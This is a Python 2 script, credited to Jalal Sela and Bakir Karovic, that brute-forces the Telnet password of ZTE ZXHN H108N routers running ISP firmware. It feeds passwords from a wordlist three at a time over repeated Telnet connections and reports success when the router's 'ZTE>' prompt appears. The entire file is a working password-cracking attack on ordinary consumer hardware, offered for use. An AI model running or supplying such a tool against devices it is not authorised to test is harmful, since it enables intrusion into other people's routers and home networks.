#!/usr/bin/env python

#ZTE_Hacking

import telnetlib
import time
from sys import stdout
import argparse
import socket


def main():
	#Getting the argments

	progInfo = 'This script is for ZTE modems with custom firmware by specific ISPs. This is a brute-force tool build to crack the ZTE ZXHN H108N Telnet password. For more information, check: https://jalalsela.com/hacking-zxhn-h108n-router/'
	footer = 'Original script is created by: Jalal Sela (Ligeti), this version is created by Bakir Karovic'

	parser = argparse.ArgumentParser(description = progInfo, epilog=footer)
	parser.add_argument('-a', '--addr', help='The IP address of ZTE AP (default: 192.168.1.1)', default='192.168.1.1')
	parser.add_argument('-u', '--user',  help='Username to use (default: root)', default='root')
	requiredNamed = parser.add_argument_group('required named arguments')
	requiredNamed.add_argument('-w', '--wordlist', help='The path to the worldlist', required=True) 
	
	args = parser.parse_args()

	print 'Address: ' + args.addr
	print 'Username: ' + args.user
	print 'Wordlist: ' + args.wordlist 

	# Load the wordlist file
	with open(args.wordlist, 'r+') as f:
		# Read the file      
		lines = f.readlines()
		print 'Dictionary loaded successfully (' + str(len(lines)) + ') passwords'
		# Telnet
		connection = telnetlib.Telnet()
		print 'Connection OK...'
		chk = 'NULL'
		# Testing
		max = len(lines)
		password = lines[0]
		i = -1
		while True:
			try:
				# Connect to the router (Telnet)
				connection.open(args.addr)

				# Print what the modem is asking if you're not sure if the modem is asking for username or password
				#for line in connection.read_some(): print(line)


				# Modems with custom firmware don't offer option for entering username so this part is left out
				# Read until the server/Router asks for username!
				#chk = connection.read_until('Username:')
				# Send the username (root)
				#connection.write(args.user+'\r\n')


				# Read until the server/Router asks for password!
				chk = connection.read_until('Password:')
				# We have three chances before we lose the connection. (on some modems four chances)
				for x in range (0, 3):
					i += 1
					password = lines[i]
					print 'Test (%d/%d):  %s'%(i, x+1, password)
					connection.write(password)
					chk = connection.read_until('Password:', 1)
					if (len(chk) != 2):
						 print 'Results(%d): %d\t%s\n.............................'%(i, len(chk), chk)
					else:
						print 'Connection closed!\n.............................'

					if ('ZTE>' in chk):
						print '------------------------------\nHacked: ' + password
						exit()
				connection.close()                
				time.sleep(0.01)
			except Exception, e:
				print 'Error (' + time.ctime(time.time()) + '): ' + str(e)
	exit()
if __name__=="__main__":
	main()